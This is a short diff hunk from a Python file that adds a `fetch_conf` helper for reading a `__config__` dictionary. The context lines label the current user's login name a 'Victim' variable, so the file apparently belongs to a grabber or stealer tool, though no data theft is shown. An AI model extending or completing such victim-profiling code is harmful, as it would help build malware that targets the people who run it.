@@ -59,6 +59,9 @@ __config__ = {
     ]
 
 }
+#lol
+def fetch_conf(e: str) -> str or bool | None:
+        return __config__.get(e)
 # global variables
 if fetch_conf('dev'): print("Setting up Victim var") 
 Victim = os.getlogin()
